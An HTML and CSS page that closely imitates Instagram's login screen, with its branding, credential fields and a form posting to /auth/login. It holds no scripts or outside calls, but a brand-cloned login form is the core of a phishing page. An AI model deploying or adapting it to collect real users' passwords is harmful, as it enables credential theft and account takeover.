<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <title>Mobile-Friendly Instagram Login</title>
    <style>
        /* Base styles */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column; /* Allow content to stack */
            justify-content: flex-start; /* Start content from top on mobile */
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #fafafa;
            padding-top: 20px; /* Add some top padding for mobile view */
        }

        /* Container and Card Look */
        .login-card {
            background-color: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 40px 30px;
            width: 90%; /* Use percentage width for flexibility */
            max-width: 350px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
            text-align: center;
            box-sizing: border-box; /* Include padding and border in the element's total width and height */
        }

        /* Instagram Logo Header */
        .logo-header {
            margin-bottom: 30px;
            padding: 15px 0;
            background: linear-gradient(
                45deg,
                #f09433 0%,
                #e6683c 25%,
                #dc2743 50%,
                #cc2366 75%,
                #bc1888 100%
            );
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 32px;
            font-weight: 700;
        }

        /* Input Styling */
        .input-group {
            margin-bottom: 10px;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            box-sizing: border-box; 
            font-size: 14px;
            color: #262626;
            transition: border-color 0.2s;
        }

        .input-group input:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        
        /* Submit Button Styling */
        .login-button {
            width: 100%;
            padding: 10px;
            margin-top: 15px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            opacity: 0.8;
            transition: opacity 0.3s;
        }

        .login-button:hover {
            opacity: 1;
        }

        .separator {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
        }

        .separator::before,
        .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .separator:not(:empty)::before {
            margin-right: .25em;
        }

        .separator:not(:empty)::after {
            margin-left: .25em;
        }

        .separator span {
            color: #8e8e8e;
            font-size: 12px;
            font-weight: bold;
            text-transform: uppercase;
        }

        /* Link card styling */
        .link-card {
            margin-top: 10px;
            padding: 20px;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            background-color: white;
            width: 90%;
            max-width: 350px;
            box-sizing: border-box;
        }

        /* --- Media Query for Small Screens (Optional, but good practice) --- */
        @media (max-width: 480px) {
            .login-card, .link-card {
                /* On very small screens, remove border and shadow to make it feel native */
                border: none;
                box-shadow: none;
                max-width: 100%; /* Take up full width */
                padding: 30px 20px;
                margin: 0;
            }

            body {
                padding-top: 0;
                background-color: white; /* Match background to form background */
            }
        }
    </style>
</head>
<body>
    <div class="login-card">
        
        <h1 class="logo-header">Instagram</h1>
        
        <form action="/auth/login" method="POST">
            <div class="input-group">
                <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
            </div>
            
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>
            
            <button type="submit" class="login-button">Log In</button>
        </form>

        <div class="separator"><span>OR</span></div>
        
        <p style="font-size: 14px; color: #0095f6; font-weight: bold; margin: 20px 0 0;">
            Log in with Facebook
        </p>

        <p style="font-size: 12px; color: #00376b; margin-top: 10px;">
            <a href="#" style="text-decoration: none; color: #00376b;">Forgot password?</a>
        </p>
    </div>

    <div class="link-card">
        <p style="font-size: 14px;">
            Don't have an account? 
            <a href="#" style="text-decoration: none; color: #0095f6; font-weight: bold;">Sign up</a>
        </p>
    </div>
</body>
</html>
